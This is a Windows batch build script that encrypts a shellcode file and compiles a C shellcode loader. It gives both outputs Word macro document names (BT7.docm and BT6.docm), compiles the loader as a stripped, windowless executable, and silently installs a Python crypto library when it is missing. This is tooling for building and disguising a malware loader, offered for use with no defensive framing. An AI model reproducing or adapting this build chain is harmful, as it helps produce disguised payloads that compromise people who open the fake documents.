@echo off
REM Build Script - Encrypt Shellcode & Compile Loader
REM Usage: build.bat

setlocal enabledelayedexpansion
set SHELLCODE_FILE=shellcode.bin
set ENCRYPTED_FILE=BT7.docm
set LOADER_OUTPUT=BT6.docm
set LOADER_SOURCE=loader\src\loader.c

REM Check if shellcode exists
if not exist "%SHELLCODE_FILE%" (
    echo [-] Error: %SHELLCODE_FILE% not found!
    pause
    exit /b 1
)

echo [*] Step 1: Encrypting shellcode...

REM Check Python
where python >nul 2>&1
if errorlevel 1 (
    echo [-] Python not found!
    pause
    exit /b 1
)

REM Install cryptography if needed
python -c "import cryptography" >nul 2>&1
if errorlevel 1 (
    pip install cryptography >nul 2>&1
    if errorlevel 1 (
        echo [-] Failed to install cryptography!
        pause
        exit /b 1
    )
)

REM Encrypt shellcode
python loader\encryptor.py "%SHELLCODE_FILE%" "%ENCRYPTED_FILE%"

if not exist "%ENCRYPTED_FILE%" (
    echo [-] Failed to encrypt shellcode!
    pause
    exit /b 1
)

echo.
echo [*] Step 2: Compiling loader...
echo.

REM Check for compiler
where gcc >nul 2>&1
if errorlevel 1 (
    echo [-] GCC not found!
    pause
    exit /b 1
)

REM Compile loader
cd loader
gcc -O2 ^
    -s ^
    src\loader.c ^
    -o "..\%LOADER_OUTPUT%" ^
    -lbcrypt ^
    -mwindows

cd ..

if not exist "%LOADER_OUTPUT%" (
    echo [-] Failed to compile loader!
    pause
    exit /b 1
)

REM Get file sizes
for %%A in ("%ENCRYPTED_FILE%") do set ENCRYPTED_SIZE=%%~zA
for %%A in ("%LOADER_OUTPUT%") do set LOADER_SIZE=%%~zA

echo.
echo ================================================================
echo                  Build Successful!
echo ================================================================
echo.
echo [+] Files generated:
echo   - %ENCRYPTED_FILE% (!ENCRYPTED_SIZE! bytes) - Encrypted shellcode
echo   - %LOADER_OUTPUT% (!LOADER_SIZE! bytes) - Loader executable
